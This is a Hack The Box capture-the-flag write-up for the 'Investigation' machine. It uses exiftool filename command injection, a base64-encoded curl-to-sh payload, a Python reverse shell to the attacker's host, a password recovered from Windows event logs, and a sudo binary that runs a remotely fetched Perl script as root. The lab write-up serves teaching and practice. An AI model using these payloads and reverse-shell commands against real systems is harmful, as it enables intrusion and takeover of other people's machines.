### Investigation HTB

### Difficulty = Intermediate

### IP Address = 10.129.138.243

Nmap Scan:

```                                                                                                                                                                                                                 
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Investigation]
└─$ cat nmapscan                    
# Nmap 7.92 scan initiated Sun Jan 22 22:13:36 2023 as: nmap -sCV -A -p22,80 -oN nmapscan -Pn 10.129.138.243
Nmap scan report for 10.129.138.243
Host is up (1.0s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2f:1e:63:06:aa:6e:bb:cc:0d:19:d4:15:26:74:c6:d9 (RSA)
|   256 27:45:20:ad:d2:fa:a7:3a:83:73:d9:7c:79:ab:f3:0b (ECDSA)
|_  256 42:45:eb:91:6e:21:02:06:17:b2:74:8b:c5:83:4f:e0 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://eforenzics.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 22 22:13:58 2023 -- 1 IP address (1 host up) scanned in 22.85 seconds
```

Adding `eforenzics.htb` to `/etc/hosts` file

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Investigation]
└─$ cat /etc/hosts | grep efo                                    
10.129.138.243  eforenzics.htb
```

Checking out the web server 
![image](https://user-images.githubusercontent.com/113513376/213943681-28b3bd13-07cc-48a2-89c9-8855e470495c.png)

Fuzzing for sub domain doesn't return anything

So checking out the function the web service provides

We see it allows upload of file then it claims it will provide forensics analyse of the file uploaded
![image](https://user-images.githubusercontent.com/113513376/213943741-b2e7244d-3335-4bbb-9625-12dc1cf9baba.png)

Lets upload a file

I first checked what's gonna happen if a file is uploaded
![image](https://user-images.githubusercontent.com/113513376/213943775-e6bac841-b908-4e23-b201-731dcf726534.png)

But unfortunately it allows only jpeg or png files to be uploaded
![image](https://user-images.githubusercontent.com/113513376/213943807-f04a1149-6b7a-4c6a-b1e4-ea55d6571ee3.png)

Alright i'll upload a real png file now
![image](https://user-images.githubusercontent.com/113513376/213943837-d38a9fd7-6f7f-49db-a40f-d0ad2b46e4a3.png)

It uploaded
![image](https://user-images.githubusercontent.com/113513376/213943854-6136e181-70ec-43a9-a4b8-584409fa4305.png)

On viewing the content i get this
![image](https://user-images.githubusercontent.com/113513376/213943870-787588a2-e3df-421b-97a8-38d2c0e4b17f.png)

So this is running exiftool on the files uploaded and also it appends .txt at the end of the file

But what is of interest here is the version of the exiftool which in this case its 12.37

Checking google for exiftool 12.37 exploit 

It leads to this github gist https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429

Meaning the version of the exiftool is vulnerable to command injection 

Lets check it out

So i'll try to ping my host first to confirm if it works

And i have the upload request in my proxy which is of course burp

```
POST /upload.php HTTP/1.1
Host: eforenzics.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------4908921738341505612159058985
Content-Length: 876
Origin: http://eforenzics.htb
Connection: close
Referer: http://eforenzics.htb/service.html
Upgrade-Insecure-Requests: 1

-----------------------------4908921738341505612159058985
Content-Disposition: form-data; name="image"; filename="ping -c 5 10.10.16.54 |"
Content-Type: image/png

PNG

```

And back on the tcpdump 

```
──(mark__haxor)-[~]
└─$ sudo tcpdump -i tun0 icmp
[sudo] password for mark: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
23:36:18.171277 IP eforenzics.htb > haxor: ICMP echo request, id 1, seq 3226, length 64
23:36:18.171295 IP haxor > eforenzics.htb: ICMP echo reply, id 1, seq 3226, length 64
23:36:19.173764 IP eforenzics.htb > haxor: ICMP echo request, id 1, seq 3227, length 64
23:36:19.173800 IP haxor > eforenzics.htb: ICMP echo reply, id 1, seq 3227, length 64
23:36:20.177580 IP eforenzics.htb > haxor: ICMP echo request, id 1, seq 3228, length 64
23:36:20.177599 IP haxor > eforenzics.htb: ICMP echo reply, id 1, seq 3228, length 64
23:36:21.179802 IP eforenzics.htb > haxor: ICMP echo request, id 1, seq 3229, length 64
23:36:21.179822 IP haxor > eforenzics.htb: ICMP echo reply, id 1, seq 3229, length 64
```

This means we indeed have command injection

Lets get a shell via this

So trying like normal payload didn't work for me

Here's what i then did

Since the command injection is based on the file we upload that means i can try uploading a file in which its name is our payload

```
┌──(mark__haxor)-[~]
└─$ echo -n "curl 10.10.16.54/shell.sh|sh" | base64
Y3VybCAxMC4xMC4xNi41NC9zaGVsbC5zaHxzaA==
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~]
└─$ mv payload.png 'echo Y3VybCAxMC4xMC4xNi41NC9zaGVsbC5zaHxzaA== |base64 -d|sh |'  
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~]
└─$ ls echo\ Y3VybCAxMC4xMC4xNi41NC9zaGVsbC5zaHxzaA=\=\ \|base64\ -d\|sh\ \| 
'echo Y3VybCAxMC4xMC4xNi41NC9zaGVsbC5zaHxzaA== |base64 -d|sh |'
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~]
└─$ 

```

So the content of the shell.sh file will be my reverse shell and i'll also set a python web server in the same directory as where the shell.sh is in

```
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/Scripts]
└─$ cat shell.sh 
#!/bin/bash

export RHOST="10.10.16.54";export RPORT=1337;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/Scripts]
└─$ pyws -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now i'll upload the payload now
![image](https://user-images.githubusercontent.com/113513376/213944296-b044d57b-401e-410f-af7e-7cbdf3af4bf6.png)

Then after i press upload it just hangs but back on the netcat listener we get a callback

```
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.54] from (UNKNOWN) [10.129.138.243] 52110
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

Now stabilizing the shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL + Z
stty raw -echo;fg
reset
```

We have only one user and we don't have access to his directory

```
www-data@investigation:~/uploads/1674427385$ cd /home
www-data@investigation:/home$ ls
smorton
www-data@investigation:/home$ cd smorton/
bash: cd: smorton/: Permission denied
www-data@investigation:/home$ 
```

I'll upload pspy and linpeash.sh

After about some minutes pspy showed a cron is running 

Lets check crontab out

```
www-data@investigation:/tmp$ crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command

*/5 * * * * date >> /usr/local/investigation/analysed_log && echo "Clearing folders" >> /usr/local/investigation/analysed_log && rm -r /var/www/uploads/* && rm /var/www/html/analysed_images/*
www-data@investigation:/tmp$ 

```

And its running every 5minutes

Checking out the directory of /usr/local/investigations

We see a file 

```
www-data@investigation:/usr/local/investigation$ ls
'Windows Event Logs for Analysis.msg'   analysed_log
www-data@investigation:/usr/local/investigation$ 
```

I'll download the windows event log for anaysis file to my machine

Using python

```
www-data@investigation:/usr/local/investigation$ ls
'Windows Event Logs for Analysis.msg'   analysed_log
www-data@investigation:/usr/local/investigation$ cp Windows\ Event\ Logs\ for\ Analysis.msg /tmp/log.msg
www-data@investigation:/usr/local/investigation$ cd /tmp
www-data@investigation:/tmp$ python3 -m http.server 9001
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...

```

Now on my machine i get the file

```
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Investigation]
└─$ wget http://eforenzics.htb:9001/log.msg
--2023-01-22 23:51:20--  http://eforenzics.htb:9001/log.msg
Resolving eforenzics.htb (eforenzics.htb)... 10.129.138.243
Connecting to eforenzics.htb (eforenzics.htb)|10.129.138.243|:9001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1308160 (1.2M) [application/octet-stream]
Saving to: _log.msg_

log.msg                                              100%[=====================================================================================================================>]   1.25M   171KB/s    in 16s     

2023-01-22 23:51:37 (80.0 KB/s) - _log.msg_ saved [1308160/1308160]
```

Now lets analyse the file

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Investigation]
└─$ file log.msg        
log.msg: CDFV2 Microsoft Outlook Message
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Investigation]
└─$ 
```

its a microsoft outlook message file

I don't have outlook on my pc

So i'll use msgconvert tool to convert it to an eml file

```
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Investigation]
└─$ msgconvert log.msg 
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Investigation]
└─$ ls
log.eml  log.msg  nmapscan
```

Now lets read this file

```
Hi Steve,

Can you look through these logs to see if our analysts have been logging on to the inspection terminal. I'm concerned that they are moving data on to production without following our data transfer procedures. 

Regards.
Tom
```

And below the message is the file encoded in base64
![image](https://user-images.githubusercontent.com/113513376/213944831-deb043df-9848-4e4f-9db3-a06620b117fd.png)

So i saved the base64 encoded value in a file
![image](https://user-images.githubusercontent.com/113513376/213944916-8e2f7783-53f8-4dc0-80a2-dec236bb819e.png)

Then we need to remove those new lines and i used tr for that then decoded it

```
                                                                                                                                                                                                                   
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Investigation]
└─$ cat evtx-logs.enc| tr -d "\n" > evtx-logs  
                                                                                                                                                                                                                   
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Investigation]
└─$ cat evtx-logs | base64 -d > evtx-logs.zip
                                                                                                                                                                                                                   
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Investigation]
└─$ file evtx-logs.zip 
evtx-logs.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
                                                                                                                                                                                                                   
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Investigation]
└─$ 

```

Now i'll unzip it

```
┌──(mark㉿haxor)-[~/…/B2B/HTB/Investigation/log]
└─$ unzip evtx-logs.zip 
Archive:  evtx-logs.zip
  inflating: security.evtx           
                                                                                                                                                                                                                   
┌──(mark㉿haxor)-[~/…/B2B/HTB/Investigation/log]
└─$ ls
evtx-logs.zip  security.evtx
                                                                                                                                                                                                                   
┌──(mark㉿haxor)-[~/…/B2B/HTB/Investigation/log]
└─$ file security.evtx 
security.evtx: MS Windows Vista Event Log, 238 chunks (no. 237 in use), next record no. 20013
                                                                                                                                                                                                                   
┌──(mark㉿haxor)-[~/…/B2B/HTB/Investigation/log]
└─$ 

```

Now we have the windows event log file

Time to dump the logs and i'll be using https://github.com/williballenthin/python-evtx/blob/master/scripts/evtx_dump.py

```
┌──(venv)─(mark㉿haxor)-[~/…/B2B/HTB/Investigation/log]
└─$ python ~/Desktop/Tools/python-evtx/scripts/evtx_dump.py security.evtx
<?xml version="1.1" encoding="utf-8" standalone="yes" ?>

<Events>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Eventlog" Guid="{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}"></Provider>
<EventID Qualifiers="">1102</EventID>
<Version>0</Version>
<Level>4</Level>
<Task>104</Task>
<Opcode>0</Opcode>
<Keywords>0x4020000000000000</Keywords>
<TimeCreated SystemTime="2022-08-01 16:00:21.480885"></TimeCreated>
<EventRecordID>11363186</EventRecordID>
<Correlation ActivityID="" RelatedActivityID=""></Correlation>
<Execution ProcessID="548" ThreadID="2564"></Execution>
<Channel>Security</Channel>
<Computer>eForenzics-DI</Computer>
<Security UserID=""></Security>
</System>
<UserData><LogFileCleared xmlns="http://manifests.microsoft.com/win/2004/08/windows/eventlog"><SubjectUserSid>S-1-5-21-3901137903-2834048592-2457289426-1000</SubjectUserSid>
<SubjectUserName>SMorton</SubjectUserName>
<SubjectDomainName>EFORENZICS-DI</SubjectDomainName>
<SubjectLogonId>0x0000000000138bf2</SubjectLogonId>
</LogFileCleared>
</UserData>
</Event>
```

The event is quite much 

But after grepping for failed logins i get an event which has a failed login and its iD is 4625

So now i'll just grep it

```                                                                                                                                                                                                               
┌──(venv)─(mark㉿haxor)-[~/…/B2B/HTB/Investigation/log]
└─$ python ~/Desktop/Tools/python-evtx/scripts/evtx_dump.py security.evtx | grep -A 42 '4625</EventID>'

[-----------------------------------------------------------------SNIP-------------------------------------------------------------]
<EventID Qualifiers="">4625</EventID>
<Version>0</Version>
<Level>0</Level>
<Task>12544</Task>
<Opcode>0</Opcode>
<Keywords>0x8010000000000000</Keywords>
<TimeCreated SystemTime="2022-08-01 19:15:15.374769"></TimeCreated>
<EventRecordID>11373331</EventRecordID>
<Correlation ActivityID="{6a946884-a5bc-0001-d968-946abca5d801}" RelatedActivityID=""></Correlation>
<Execution ProcessID="628" ThreadID="6800"></Execution>
<Channel>Security</Channel>
<Computer>eForenzics-DI</Computer>
<Security UserID=""></Security>
</System>
<EventData><Data Name="SubjectUserSid">S-1-5-18</Data>
<Data Name="SubjectUserName">EFORENZICS-DI$</Data>
<Data Name="SubjectDomainName">WORKGROUP</Data>
<Data Name="SubjectLogonId">0x00000000000003e7</Data>
<Data Name="TargetUserSid">S-1-0-0</Data>
<Data Name="TargetUserName">Def@ultf0r3nz!csPa$$</Data>
<Data Name="TargetDomainName"></Data>
<Data Name="Status">0xc000006d</Data>
<Data Name="FailureReason">%%2313</Data>
<Data Name="SubStatus">0xc0000064</Data>
<Data Name="LogonType">7</Data>
<Data Name="LogonProcessName">User32 </Data>
<Data Name="AuthenticationPackageName">Negotiate</Data>
<Data Name="WorkstationName">EFORENZICS-DI</Data>
<Data Name="TransmittedServices">-</Data>
<Data Name="LmPackageName">-</Data>
<Data Name="KeyLength">0</Data>
<Data Name="ProcessId">0x0000000000000180</Data>
<Data Name="ProcessName">C:\Windows\System32\svchost.exe</Data>
<Data Name="IpAddress">127.0.0.1</Data>
<Data Name="IpPort">0</Data>
</EventData>
</Event>
```

We see that the user password is also in the event log

Now i'll ssh as the user to the box using this password `Def@ultf0r3nz!csPa$$`

```
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Investigation]
└─$ ssh smorton@eforenzics.htb 
The authenticity of host 'eforenzics.htb (10.129.138.243)' can't be established.
ED25519 key fingerprint is SHA256:lYSJubnhYfFdsTiyPfAa+pgbuxOaSJGV8ItfpUK84Vw.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'eforenzics.htb' (ED25519) to the list of known hosts.
smorton@eforenzics.htb's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-137-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 22 Jan 2023 11:15:39 PM UTC

  System load:  0.0               Processes:             248
  Usage of /:   60.2% of 3.97GB   Users logged in:       0
  Memory usage: 12%               IPv4 address for eth0: 10.129.138.243
  Swap usage:   0%


0 updates can be applied immediately.


smorton@investigation:~$ ls
user.txt
smorton@investigation:~$ 
```

checking sudo permission shows we can run /usr/bin/binary as root

```
smorton@investigation:~$ sudo -l
Matching Defaults entries for smorton on investigation:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User smorton may run the following commands on investigation:
    (root) NOPASSWD: /usr/bin/binary
smorton@investigation:~$ 

```

When i run it, it justs prints out existing

```
smorton@investigation:~$ sudo binary
Exiting... 
smorton@investigation:~$ sudo binary --help
Exiting... 
smorton@investigation:~$ sudo binary -h
Exiting... 
smorton@investigation:~$ 

```

I'll get the binary to my machine and decompile it to know whats going on

```
smorton@investigation:~$ cp /usr/bin/binary .
smorton@investigation:~$ python3 -m http.server 9001
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...

```

I'll get it now

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Investigation]
└─$ wget eforenzics.htb:9001/binary                                                       
--2023-01-23 00:21:58--  http://eforenzics.htb:9001/binary
Resolving eforenzics.htb (eforenzics.htb)... 10.129.138.243
Connecting to eforenzics.htb (eforenzics.htb)|10.129.138.243|:9001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 19024 (19K) [application/octet-stream]
Saving to: _binary_

binary                                               100%[=====================================================================================================================>]  18.58K  62.7KB/s    in 0.3s    

2023-01-23 00:21:58 (62.7 KB/s) - _binary_ saved [19024/19024]

                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Investigation]
└─$ chmod +x binary          
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Investigation]
└─$ ./binary 
Exiting... 
 ```
 
 Now i'll open it up in ghidra
 
 The decompiled code shows it requires 2 arguments
 ![image](https://user-images.githubusercontent.com/113513376/213946230-f671223c-8999-41f8-9a08-ab92b5adc557.png)

```
undefined8 main(int param_1,long param_2)

{
  __uid_t _Var1;
  int iVar2;
  FILE *__stream;
  undefined8 uVar3;
  char *__s;
  char *__s_00;
  
  if (param_1 != 3) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  _Var1 = getuid();
  if (_Var1 != 0) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar2 = strcmp(*(char **)(param_2 + 0x10),"lDnxUysaQn");
  if (iVar2 != 0) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Running... ");
  __stream = fopen(*(char **)(param_2 + 0x10),"wb");
  uVar3 = curl_easy_init();
  curl_easy_setopt(uVar3,0x2712,*(undefined8 *)(param_2 + 8));
  curl_easy_setopt(uVar3,0x2711,__stream);
  curl_easy_setopt(uVar3,0x2d,1);
  iVar2 = curl_easy_perform(uVar3);
  if (iVar2 == 0) {
    iVar2 = snprintf((char *)0x0,0,"%s",*(undefined8 *)(param_2 + 0x10));
    __s = (char *)malloc((long)iVar2 + 1);
    snprintf(__s,(long)iVar2 + 1,"%s",*(undefined8 *)(param_2 + 0x10));
    iVar2 = snprintf((char *)0x0,0,"perl ./%s",__s);
    __s_00 = (char *)malloc((long)iVar2 + 1);
    snprintf(__s_00,(long)iVar2 + 1,"perl ./%s",__s);
    fclose(__stream);
    curl_easy_cleanup(uVar3);
    setuid(0);
    system(__s_00);
    system("rm -f ./lDnxUysaQn");
    return 0;
  }
  puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

So here's what is happening

```
1. It first checks if the number of command-line arguments passed to the program (stored in the variable
“argc”) is equal to 3. If not, it prints “Exiting...” and exits the program.

2. It then checks if the user running the program has a non-zero UID (user ID), which would indicate that
they are not running as the root user. If they are not running as root, it prints “Exiting...” and exits the
program.

3. It then checks if the third command-line argument (stored in “argv[2]”) is equal to the string
“lDnxUysaQn”. If not, it prints “Exiting...” and exits the program.

4. If all of the above conditions are met, the program then opens a file with the name specified in
argv[2] in write mode, opens a connection to the URL specified in argv[1] using the curl library, writes
the contents of the URL to the file, and then closes the file and the connection.

5. It then formats a string “perl ./%s”, where %s is the third command-line argument passed to the
program.

6. It then runs the command using the system() function, which is a library function that can be used to
run shell commands from within a C program.

7. Finally, it removes the file “lDnxUysaQn” from the current directory and exits the program.
```

So basically we can run perl system command 

So time to make our payload xD

In my cwd i'll make a file which would call /bin/bash

```
                                                                                                                                                                                                                   
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Investigation]
└─$ echo 'exec "/bin/bash";' > bash.pl
                                                                                                                                                                                                                   
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Investigation]
└─$ pyws -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now on the target i run the binary with the required parameters

```
smorton@investigation:~$ sudo binary http://10.10.16.54/bash.pl lDnxUysaQn
Running... 
root@investigation:/home/smorton# cd /root
root@investigation:~# ls -al
total 28
drwx------  4 root root 4096 Jan 22 19:10 .
drwxr-xr-x 18 root root 4096 Jan  9 16:53 ..
lrwxrwxrwx  1 root root    9 Aug 30 06:00 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Sep  2 20:54 .cache
drwxr-xr-x  3 root root 4096 Jan  6 09:31 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r-----  1 root root   33 Jan 22 19:10 root.txt
root@investigation:~# cat root.txt 
b375b645f61c74d36039066c38f9ac0f
root@investigation:~# 
```

And we're done 

<br> <br>
[Back To Home](../../index.md)
<br>

